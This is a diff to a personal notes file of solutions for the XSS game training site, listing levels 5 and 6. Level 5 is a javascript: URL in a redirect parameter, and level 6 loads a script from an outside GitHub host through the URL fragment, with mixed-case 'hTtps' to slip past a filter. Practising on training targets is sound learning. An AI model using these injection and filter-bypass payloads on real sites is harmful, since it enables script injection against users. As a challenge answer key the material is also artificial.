@@ -17,3 +17,6 @@ level 5:
 javascript:alert("hola mundo!")
 https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert("hola mundo!")
 
+level 6:
+https://xss-game.appspot.com/level6/frame#hTtps://raw.githubusercontent.com/jojosardez/xss-test/master/script.js
+https://xss-game.appspot.com/level6/frame#hTtps://rawgit.com/jojosardez/xss-test/master/script.js
